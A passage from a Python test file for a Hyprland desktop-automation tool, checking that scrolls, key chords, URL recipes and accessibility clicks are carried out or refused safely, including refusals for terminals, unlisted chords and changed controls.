    monkeypatch.setattr(executor, "_booted", False)
    monkeypatch.setenv("HYPRUSE_STRICT", "1")
    monkeypatch.setattr(session, "ensure_session_env", lambda: order.append("session"))
    monkeypatch.setattr(server, "use_plain_blocks", lambda: order.append("plain"))
    monkeypatch.setattr(safety, "arm", lambda: order.append("arm"))
    monkeypatch.setattr(safety, "init", lambda: order.append("init"))
    monkeypatch.setattr(safety, "on_shutdown", lambda fn: order.append(fn))

    executor.boot()
    executor.boot()

    assert order == ["session", "plain", "arm", hinput.release_held]
    assert "HYPRUSE_STRICT" not in executor.os.environ


# --------------------------------------------------------------- reaching inside a window

from dataclasses import replace as _replace  # noqa: E402

from hyprsay import controls, recipes  # noqa: E402

BROWSER = Window("0xb1", "firefox", "firefox", "Docs", 1, "1", 0, at=(0, 0), size=(1000, 800))
SHELL = Window("0x7f", "kitty", "kitty", "fish", 1, "1", 0, at=(0, 0), size=(800, 600))

KINDS = {"firefox": "web browser", "org.gnome.TextEditor": "code editor", "kitty": "terminal"}


class Lexicon:
    """Only what `ops` reads: the kind a window's trusted desktop file declares."""

    def kind_of(self, window):
        return KINDS.get(window.cls, "")


@pytest.fixture
def inside(desk, monkeypatch):
    """A desk whose focused window is a browser, with the engine's executor registered.

    `ops` reads the running engine's configuration and lexicon the way `recipes` does.
    Without one every window's kind is unknown and every gesture is refused, which is the
    fail-closed direction and not what these tests are about.
    """
    desk.state = _replace(STATE, windows=(BROWSER, SHELL, EDITOR), active_address=BROWSER.address)

    def pointer(action, x=None, y=None, button="left", to_x=None, to_y=None, scroll_dy=0,
                scroll_dx=0, double=False, then="none", allow_auth=False):  # fmt: skip
        return desk._record("pointer", ("pointer", action, x, y, scroll_dy, scroll_dx), "scrolled")

    def click_ui(name="", window="", **kw):
        return desk._record(
            "click_ui", ("click_ui", name, window), f"clicked push button {name!r} in firefox"
        )

    monkeypatch.setattr(server, "pointer", pointer)
    monkeypatch.setattr(server, "click_ui", click_ui)
    monkeypatch.setattr(recipes.time, "sleep", lambda seconds: None)
    acts = Executor(Config(), desk.provide, desk.latch, Lexicon())
    executor.use(acts)
    yield desk, acts
    executor.use(None)


def test_a_scroll_becomes_wheel_notches_aimed_at_the_middle_of_the_window(inside):
    desk, acts = inside
    outcome = acts.execute(Action(Intent.SCROLL, window=BROWSER, direction=Direction.DOWN))
    assert outcome.ok, outcome.message
    assert desk.writes == [("pointer", "scroll", 500.0, 400.0, 4, 0)]


def test_a_scroll_is_undone_by_the_same_notches_the_other_way(inside):
    desk, acts = inside
    outcome = acts.execute(Action(Intent.SCROLL, window=BROWSER, direction=Direction.DOWN))
    assert outcome.inverse == Action(Intent.SCROLL, window=BROWSER, direction=Direction.UP)


def test_a_chord_goes_out_through_the_guarded_keyboard_call_pinned_to_the_window(inside):
    desk, acts = inside
    outcome = acts.execute(Action(Intent.PRESS_CHORD, window=BROWSER, verb="Page_Down"))
    assert outcome.ok, outcome.message
    assert desk.writes == [("keyboard", "key", "", "Page_Down", "0xb1", False)]
    assert outcome.inverse.verb == "Page_Up"


def test_a_chord_with_no_way_back_is_offered_no_undo(inside):
    _, acts = inside
    assert acts.execute(Action(Intent.PRESS_CHORD, window=BROWSER, verb="Home")).inverse is None


def test_a_chord_the_table_does_not_hold_is_refused_and_nothing_is_delivered(inside):
    desk, acts = inside
    outcome = acts.execute(Action(Intent.PRESS_CHORD, window=BROWSER, verb="ctrl+alt+z"))
    assert not outcome.ok
    assert desk.writes == []


@pytest.mark.parametrize("intent", [Intent.SCROLL, Intent.PRESS_CHORD])
def test_no_gesture_reaches_a_terminal_however_it_got_this_far(inside, intent):
    desk, acts = inside
    action = Action(intent, window=SHELL, direction=Direction.DOWN, verb="Page_Down")
    outcome = acts.execute(action)
    assert not outcome.ok and "terminal" in outcome.message
    assert desk.writes == []


def test_a_gesture_is_refused_while_a_launcher_holds_the_keyboard(inside):
    desk, acts = inside
    desk.state = _replace(desk.state, layers=(Layer("rofi", "eDP-1", 3),))
    outcome = acts.execute(Action(Intent.SCROLL, window=BROWSER, direction=Direction.DOWN))
    assert not outcome.ok and "rofi" in outcome.message
    assert desk.writes == []


def test_a_recipe_presses_its_reviewed_sequence_and_types_only_what_code_built(inside):
    desk, acts = inside
    action = Action(Intent.RUN_RECIPE, window=BROWSER, verb="go_to_url", text="youtube")
    outcome = acts.execute(action)
    assert outcome.ok, outcome.message
    assert desk.writes == [
        ("hypr", "focus_window", "0xb1", ""),
        ("keyboard", "key", "", "ctrl+l", "0xb1", False),
        ("keyboard", "type", "https://youtube.com/", "", "0xb1", False),
        # `recipes` writes "enter" and `inapp` spells the same key "Return"
        ("keyboard", "key", "", "Return", "0xb1", False),
    ]


def test_a_recipe_the_window_kind_does_not_offer_is_refused_rather_than_guessed(inside):
    desk, acts = inside
    desk.state = _replace(desk.state, active_address=EDITOR.address)
    outcome = acts.execute(Action(Intent.RUN_RECIPE, window=EDITOR, verb="search_web"))
    assert not outcome.ok and "search web" in outcome.message
    assert desk.writes == []


def test_a_recipe_never_types_a_phrase_that_is_not_an_address(inside):
    desk, acts = inside
    action = Action(Intent.RUN_RECIPE, window=BROWSER, verb="go_to_url", text="linus tech tips")
    outcome = acts.execute(action)
    assert not outcome.ok and "phrase" in outcome.message
    # the bar was opened before the refusal, and nothing was typed into it
    assert not any(call[:2] == ("keyboard", "type") for call in desk.writes)


def test_a_tab_close_is_offered_no_undo_and_a_tab_walk_is(inside):
    """`inapp.INVERSE_CHORDS` offers one only where it is not worse than the act: a
    closed tab keeps nothing of what was typed into it, so it gets none."""
    _, acts = inside
    closed = acts.execute(Action(Intent.PRESS_CHORD, window=BROWSER, verb="ctrl+w"))
    assert closed.ok and closed.inverse is None
    walked = acts.execute(Action(Intent.PRESS_CHORD, window=BROWSER, verb="ctrl+Tab"))
    assert walked.inverse == Action(Intent.PRESS_CHORD, window=BROWSER, verb="ctrl+shift+Tab")


def test_a_click_goes_through_the_inherited_click_ui_and_has_no_undo(inside, monkeypatch):
    desk, acts = inside
    monkeypatch.setattr(controls, "controls_for", lambda window, **kw: [_control("Send", window)])
    action = Action(Intent.CLICK_CONTROL, window=BROWSER, verb="Send", text="send")
    outcome = acts.execute(action)
    assert outcome.ok, outcome.message
    assert desk.writes == [("click_ui", "Send", "0xb1")]
    assert outcome.inverse is None


def test_a_control_that_is_no_longer_the_best_match_is_not_clicked(inside, monkeypatch):
    desk, acts = inside
    # the page redrew between the countdown and the click, and something else now answers
    monkeypatch.setattr(
        controls, "controls_for", lambda window, **kw: [_control("Send money", window)]
    )
    action = Action(Intent.CLICK_CONTROL, window=BROWSER, verb="Send", text="send")
    outcome = acts.execute(action)
    assert not outcome.ok and "changed" in outcome.message
    assert desk.writes == []


def test_an_unreadable_accessibility_tree_comes_back_as_one_plain_sentence(inside, monkeypatch):
    desk, acts = inside

    def broken(window, **kw):
        raise controls.ControlsError("no accessibility bus is running; run the repair")

    monkeypatch.setattr(controls, "controls_for", broken)
    outcome = acts.execute(Action(Intent.CLICK_CONTROL, window=BROWSER, verb="Send", text="send"))
    assert not outcome.ok and outcome.message == "no accessibility bus is running; run the repair"
    assert desk.writes == []


def _control(name: str, window: Window) -> controls.Control:
    return controls.Control(f":1.9:/{name}", name, "push button", True, (0, 0, 10, 10),
                            window.address)  # fmt: skip


def test_a_chord_with_no_engine_running_is_refused_not_guessed(desk, monkeypatch):
    """`ops` reads the engine for the window's kind. Without one nothing is known about
    the window, and an unknown kind is the case that turns keys off."""
    monkeypatch.setattr(server, "keyboard", lambda *a, **kw: "pressed")
    desk.state = _replace(STATE, windows=(BROWSER,), active_address=BROWSER.address)
    executor.use(None)
    outcome = desk.executor().execute(Action(Intent.PRESS_CHORD, window=BROWSER, verb="ctrl+t"))
    assert not outcome.ok and "kind" in outcome.message


def test_scrolling_does_not_depend_on_knowing_the_window_kind(desk, monkeypatch):
    """A wheel notch moves a view whatever the window is, so an unknown kind is no
    reason to refuse it. Only something that could reach past the view is."""
    monkeypatch.setattr(server, "pointer", lambda *a, **kw: "scrolled")
    desk.state = _replace(STATE, windows=(BROWSER,), active_address=BROWSER.address)
    executor.use(None)
    outcome = desk.executor().execute(
        Action(Intent.SCROLL, window=BROWSER, direction=Direction.DOWN)
    )
    assert outcome.ok
